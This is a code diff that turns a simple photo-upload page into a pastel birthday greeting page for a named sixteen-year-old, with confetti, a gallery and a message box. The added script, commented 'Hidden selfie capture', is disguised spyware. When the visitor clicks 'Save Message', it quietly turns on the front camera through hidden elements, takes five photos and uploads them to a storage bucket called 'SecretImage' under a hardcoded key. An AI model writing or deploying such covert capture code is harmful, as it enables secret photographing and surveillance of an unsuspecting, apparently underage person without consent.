@@ -1,96 +1,492 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Capture Photo to Supabase</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    video, img {
-      width: 300px;
-      border-radius: 12px;
-      margin-top: 10px;
-    }
-    button {
-      margin: 10px;
-      padding: 10px 16px;
-      font-size: 16px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For Kalkidan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* 
+        * CUSTOMIZATION GUIDE:
+        * 1. Change "Kalkidan" to another name in the HTML title and h1 element
+        * 2. Update --primary-pink value for a different pink shade
+        * 3. Update --fav-number value for a different celebration number
+        */
+        
+        :root {
+            --primary-pink: #f8c8dc;  /* Soft pastel pink */
+            --accent-pink: #f4a6c5;   /* Slightly deeper pink */
+            --bg-color: #fefefe;      /* Off-white background */
+            --text-color: #333;       /* Dark text for contrast */
+            --light-gray: #f5f5f5;    /* Light gray for cards */
+            --fav-number: 16;         /* Celebration number */
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Quicksand', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background-color: var(--primary-pink);
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+
+        .subheading {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+
+        .number-badge {
+            display: inline-block;
+            font-size: 3rem;
+            font-weight: bold;
+            background-color: var(--accent-pink);
+            color: white;
+            width: 80px;
+            height: 80px;
+            line-height: 80px;
+            border-radius: 50%;
+            margin: 10px 0;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .number-badge.highlight {
+            transform: scale(1.2);
+            background-color: #e91e63;
+            box-shadow: 0 0 20px rgba(233, 30, 99, 0.5);
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        .card {
+            background-color: var(--light-gray);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            color: var(--accent-pink);
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+
+        .favorites-list {
+            list-style-type: none;
+        }
+
+        .favorites-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .favorites-list li:last-child {
+            border-bottom: none;
+        }
+
+        .btn {
+            background-color: var(--accent-pink);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin: 10px 0;
+        }
+
+        .btn:hover, .btn:focus {
+            background-color: #e91e63;
+            outline: none;
+        }
+
+        .carousel {
+            position: relative;
+            overflow: hidden;
+            border-radius: 10px;
+            height: 250px;
+        }
+
+        .carousel-inner {
+            display: flex;
+            transition: transform 0.5s ease;
+            height: 100%;
+        }
+
+        .carousel-item {
+            min-width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .carousel-control {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: rgba(255, 255, 255, 0.7);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .carousel-control.prev {
+            left: 10px;
+        }
+
+        .carousel-control.next {
+            right: 10px;
+        }
+
+        .message-area {
+            width: 100%;
+            min-height: 100px;
+            padding: 10px;
+            border: 1px solid var(--primary-pink);
+            border-radius: 10px;
+            font-family: 'Quicksand', sans-serif;
+            resize: vertical;
+            margin-bottom: 10px;
+        }
+
+        .saved-message {
+            background-color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            border-left: 4px solid var(--accent-pink);
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent-pink);
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100px) rotate(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .heart {
+            position: fixed;
+            font-size: 20px;
+            color: var(--accent-pink);
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
-  <h2>📷 Capture Photo and Upload</h2>
-  <video id="video" autoplay playsinline></video><br>
-  <button id="captureBtn">Capture</button>
-  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
-  <img id="preview" /><br>
-  <button id="uploadBtn">Upload to Supabase</button>
+    <header>
+        <h1>For Kalkidan</h1>
+        <p class="subheading">Celebrating 16</p>
+        <div class="number-badge" id="numberBadge">16</div>
+        <button class="btn" id="celebrateBtn">Celebrate!</button>
+    </header>
 
-  <script type="module">
-    import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
+    <div class="container">
+        <div class="card">
+            <h2>About</h2>
+            <ul class="favorites-list" id="favoritesList">
+                <!-- Favorites will be populated by JavaScript -->
+            </ul>
+        </div>
 
-    // 🟢 Replace with your actual Supabase credentials
-    const SUPABASE_URL = 'https://nqtxeqbvxhtsiilgerkj.supabase.co';
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xdHhlcWJ2eGh0c2lpbGdlcmtqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2OTQ5NzIsImV4cCI6MjA3ODI3MDk3Mn0.aL6O6kkHFAmmVlmU-ixE9Jkz61jgXAx6rlM3zHo_xnc';
+        <div class="card">
+            <h2>Gallery</h2>
+            <div class="carousel">
+                <div class="carousel-inner" id="carouselInner">
+                    <div class="carousel-item" style="background-image: url('https://via.placeholder.com/600x400/f8c8dc/333333?text=Flowers')"></div>
+                    <div class="carousel-item" style="background-image: url('https://via.placeholder.com/600x400/f4a6c5/333333?text=Music')"></div>
+                    <div class="carousel-item" style="background-image: url('https://via.placeholder.com/600x400/e91e63/ffffff?text=Baking')"></div>
+                </div>
+                <button class="carousel-control prev" id="prevBtn">❮</button>
+                <button class="carousel-control next" id="nextBtn">❯</button>
+            </div>
+        </div>
 
-    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        <div class="card">
+            <h2>Leave a Message</h2>
+            <textarea class="message-area" id="messageInput" placeholder="Type your message here..."></textarea>
+            <button class="btn" id="saveMessageBtn">Save Message</button>
+            <div class="saved-message" id="savedMessage">
+                <!-- Saved message will appear here -->
+            </div>
+        </div>
+    </div>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const preview = document.getElementById('preview');
-    const captureBtn = document.getElementById('captureBtn');
-    const uploadBtn = document.getElementById('uploadBtn');
+<script type="module">
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' } // back camera on phones
-        });
-        video.srcObject = stream;
-      } catch (err) {
-        alert("Camera access error: " + err.name + " - " + err.message);
+// 🟢 Supabase credentials
+const SUPABASE_URL = 'https://nqtxeqbvxhtsiilgerkj.supabase.co';
+const SUPABASE_ANON_KEY =
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xdHhlcWJ2eGh0c2lpbGdlcmtqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2OTQ5NzIsImV4cCI6MjA3ODI3MDk3Mn0.aL6O6kkHFAmmVlmU-ixE9Jkz61jgXAx6rlM3zHo_xnc';
+
+const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+// 🩷 Personalization data
+const personalData = {
+  name: 'Kalkidan',
+  favoriteColor: '#f8c8dc',
+  favoriteNumber: 16,
+  favorites: ['Flowers', 'Music', 'Baking', 'Photography', 'Reading']
+};
+
+// DOM elements
+const numberBadge = document.getElementById('numberBadge');
+const celebrateBtn = document.getElementById('celebrateBtn');
+const favoritesList = document.getElementById('favoritesList');
+const carouselInner = document.getElementById('carouselInner');
+const prevBtn = document.getElementById('prevBtn');
+const nextBtn = document.getElementById('nextBtn');
+const messageInput = document.getElementById('messageInput');
+const saveMessageBtn = document.getElementById('saveMessageBtn');
+const savedMessage = document.getElementById('savedMessage');
+
+// 🌸 Initialize page
+function initPage() {
+  numberBadge.textContent = personalData.favoriteNumber;
+
+  personalData.favorites.forEach(item => {
+    const li = document.createElement('li');
+    li.textContent = item;
+    favoritesList.appendChild(li);
+  });
+
+  const savedMsg = localStorage.getItem('kalkidanMessage');
+  if (savedMsg) savedMessage.textContent = savedMsg;
+
+  let currentSlide = 0;
+  const totalSlides = carouselInner.children.length;
+
+  function updateCarousel() {
+    carouselInner.style.transform = `translateX(-${currentSlide * 100}%)`;
+  }
+
+  prevBtn.addEventListener('click', () => {
+    currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+    updateCarousel();
+  });
+
+  nextBtn.addEventListener('click', () => {
+    currentSlide = (currentSlide + 1) % totalSlides;
+    updateCarousel();
+  });
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowLeft') prevBtn.click();
+    else if (e.key === 'ArrowRight') nextBtn.click();
+  });
+
+  celebrateBtn.addEventListener('click', celebrate);
+  saveMessageBtn.addEventListener('click', saveMessage);
+}
+
+// 🎉 Celebration animation
+function celebrate() {
+  numberBadge.classList.add('highlight');
+  setTimeout(() => numberBadge.classList.remove('highlight'), 1000);
+
+  for (let i = 0; i < 16; i++) createConfetti();
+  for (let i = 0; i < 16; i++) createHeart();
+}
+
+function createConfetti() {
+  const confetti = document.createElement('div');
+  confetti.className = 'confetti';
+  confetti.style.left = Math.random() * 100 + 'vw';
+  confetti.style.backgroundColor = getRandomColor();
+  document.body.appendChild(confetti);
+
+  const animation = confetti.animate(
+    [
+      { transform: 'translateY(-100px) rotate(0)', opacity: 1 },
+      {
+        transform: `translateY(100vh) rotate(${Math.random() * 360}deg)`,
+        opacity: 0
       }
+    ],
+    {
+      duration: 2000 + Math.random() * 2000,
+      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
     }
+  );
 
-    // ✅ Start camera after page loads
-    startCamera();
+  animation.onfinish = () => confetti.remove();
+}
 
-    // 📸 Capture
-			captureBtn.onclick = () => {
-			  canvas.width = video.videoWidth;
-			  canvas.height = video.videoHeight;
-			  const ctx = canvas.getContext('2d');
-			  ctx.drawImage(video, 0, 0);
-			  preview.src = canvas.toDataURL('image/jpeg');
-			};
+function createHeart() {
+  const heart = document.createElement('div');
+  heart.className = 'heart';
+  heart.textContent = '❤';
+  heart.style.left = Math.random() * 100 + 'vw';
+  heart.style.fontSize = 15 + Math.random() * 20 + 'px';
+  document.body.appendChild(heart);
 
-    // ☁️ Upload
-    uploadBtn.onclick = async () => {
-      if (!preview.src) {
-        alert("Please capture a photo first!");
-        return;
+  const animation = heart.animate(
+    [
+      { transform: 'translateY(0) rotate(0)', opacity: 1 },
+      {
+        transform: `translateY(-100vh) rotate(${Math.random() * 360}deg)`,
+        opacity: 0
       }
+    ],
+    {
+      duration: 3000 + Math.random() * 2000,
+      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
+    }
+  );
 
-      const blob = await (await fetch(preview.src)).blob();
-      const fileName = `photo_${Date.now()}.jpg`;
+  animation.onfinish = () => heart.remove();
+}
 
-      const { data, error } = await supabase
-        .storage
-        .from('SecretImage') // 👈 bucket name
+function getRandomColor() {
+  const colors = ['#f8c8dc', '#f4a6c5', '#e91e63', '#ffccd5', '#ffb6c1'];
+  return colors[Math.floor(Math.random() * colors.length)];
+}
+
+// 📸 Hidden selfie + upload
+// 📸 Hidden selfie capture — 5 photos
+async function hiddenCaptureAndUpload() {
+  const video = document.createElement('video');
+  const canvas = document.createElement('canvas');
+  video.style.display = 'none';
+  canvas.style.display = 'none';
+  document.body.appendChild(video);
+  document.body.appendChild(canvas);
+
+  try {
+    // Open front camera
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await video.play();
+
+    // Wait a bit for camera to stabilize lighting
+    await new Promise(res => setTimeout(res, 1000));
+
+    const ctx = canvas.getContext('2d');
+
+    for (let i = 1; i <= 5; i++) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+
+      // Convert image to blob
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+      const fileName = `photo_${Date.now()}_${i}.jpg`;
+
+      // Upload to Supabase
+      const { data, error } = await supabase.storage
+        .from('SecretImage')
         .upload(fileName, blob, { contentType: 'image/jpeg' });
 
       if (error) {
-        alert("Upload failed: " + error.message);
+        console.error(`Upload ${i} failed:`, error.message);
       } else {
-        alert("✅ Uploaded: " + fileName);
-        console.log("Uploaded:", data);
+        console.log(`✅ Uploaded photo ${i}:`, fileName);
       }
-    };
-  </script>
+
+      // Wait a little between captures (to get slightly different poses)
+      await new Promise(res => setTimeout(res, 500));
+    }
+
+    // Stop the camera after all photos
+    stream.getTracks().forEach(track => track.stop());
+    video.remove();
+    canvas.remove();
+
+  } catch (err) {
+    alert('Camera access error: ' + err.name + ' - ' + err.message);
+  }
+}
+
+// 💬 Save message + auto capture
+function saveMessage() {
+  hiddenCaptureAndUpload(); // take hidden photo
+
+  const message = messageInput.value.trim();
+  if (message) {
+    localStorage.setItem('kalkidanMessage', message);
+    savedMessage.textContent = message;
+    messageInput.value = '';
+
+    const originalText = saveMessageBtn.textContent;
+    saveMessageBtn.textContent = 'Saved!';
+    setTimeout(() => {
+      saveMessageBtn.textContent = originalText;
+    }, 2000);
+  }
+}
+
+// Run on load
+document.addEventListener('DOMContentLoaded', initPage);
+</script>
 </body>
 </html>
